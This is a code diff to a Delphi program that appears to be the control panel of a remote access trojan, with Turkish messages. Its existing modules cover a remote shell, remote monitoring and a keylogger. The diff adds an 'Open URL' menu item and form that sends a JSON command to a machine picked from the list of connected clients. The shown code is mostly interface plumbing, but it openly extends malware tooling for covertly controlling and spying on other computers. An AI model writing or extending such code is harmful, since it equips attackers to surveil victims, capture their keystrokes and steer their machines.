@@ -16,6 +16,7 @@ uses
   UnitRemoteShell,
   UnitRemoteMonitoring,
   UnitKeylogger,
+  UnitOpenURL,
   Vcl.WinXCtrls;
 
 type
@@ -46,6 +47,7 @@ type
     RemoteShell1     : TMenuItem;
     RemoteMonitoring1: TMenuItem;
     Keylogger1       : TMenuItem;
+    OpenURL1         : TMenuItem;
 
     procedure Button1Click(Sender: TObject);
     procedure SendMessage1Click(Sender: TObject);
@@ -58,6 +60,7 @@ type
     procedure RemoteShell1Click(Sender: TObject);
     procedure RemoteMonitoring1Click(Sender: TObject);
     procedure Keylogger1Click(Sender: TObject);
+    procedure OpenURL1Click(Sender: TObject);
   private
     FServerManager: TServerManager;
     FCurrentPort  : Integer;
@@ -74,6 +77,7 @@ type
     procedure AddLog(Category: TLogCategory; const Msg: string);
     procedure EnsureRemoteMonitoringMenuItem;
     procedure EnsureKeyloggerMenuItem;
+    procedure EnsureOpenURLMenuItem;
     function  IsRealClientValue(const Value: string): Boolean;
     function  PreferClientValue(const NewValue, CurrentValue: string): string;
     procedure AddOrUpdateListView(const Info: TClientInfo);
@@ -114,6 +118,7 @@ begin
 
   EnsureRemoteMonitoringMenuItem;
   EnsureKeyloggerMenuItem;
+  EnsureOpenURLMenuItem;
   ListView1.OnMouseDown := ListView1MouseDown;
 end;
 
@@ -194,6 +199,21 @@ begin
   end;
 
   Keylogger1.OnClick := Keylogger1Click;
+end;
+
+procedure TForm1.EnsureOpenURLMenuItem;
+begin
+  if not Assigned(PopupMenu1) then
+    Exit;
+
+  if not Assigned(OpenURL1) then
+  begin
+    OpenURL1         := TMenuItem.Create(PopupMenu1);
+    OpenURL1.Caption := 'Open URL';
+    PopupMenu1.Items.Add(OpenURL1);
+  end;
+
+  OpenURL1.OnClick := OpenURL1Click;
 end;
 
 // ---- Server Initialization ----
@@ -402,6 +422,7 @@ begin
   FServerManager.UnregisterRemoteShellForm(aLine);
   FServerManager.UnregisterMonitoringForm(aLine);
   FServerManager.UnregisterKeyloggerForm(aLine);
+  FServerManager.UnregisterOpenURLForm(aLine);
 end;
 
 procedure TForm1.OnInfoReceived(aLine: TncLine; JSONObj: TJSONObject);
@@ -644,6 +665,49 @@ begin
 
   F7.Show;
   F7.BringToFront;
+end;
+
+procedure TForm1.OpenURL1Click(Sender: TObject);
+var
+  SelectedLine: TncLine;
+  LInfo       : TClientInfo;
+  F8          : TForm8;
+  ClientID    : string;
+begin
+  if (FServerManager = nil) or (csDestroying in ComponentState) then Exit;
+
+  if ListView1.Selected = nil then
+  begin
+    MessageBox(Handle, 'Lutfen once bir client secin.', 'Open URL',
+               MB_OK or MB_ICONWARNING);
+    Exit;
+  end;
+
+  SelectedLine := TncLine(ListView1.Selected.Data);
+  if SelectedLine = nil then
+  begin
+    MessageBox(Handle, 'Secili client bilgisi okunamadi.', 'Open URL',
+               MB_OK or MB_ICONERROR);
+    Exit;
+  end;
+
+  F8 := FServerManager.GetOpenURLForm(SelectedLine);
+
+  ClientID := 'Unknown';
+  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
+    ClientID := LInfo.ID;
+
+  if not Assigned(F8) then
+  begin
+    F8 := TForm8.Create(Application);
+    F8.SetupForClient(SelectedLine, ClientID,
+                      FServerManager.SendJSON,
+                      FServerManager.UnregisterOpenURLForm);
+    FServerManager.RegisterOpenURLForm(SelectedLine, F8);
+  end;
+
+  F8.Show;
+  F8.BringToFront;
 end;
 
 //bağlantısı kopan etc. clientleri listview1'den silen fonksiyon.
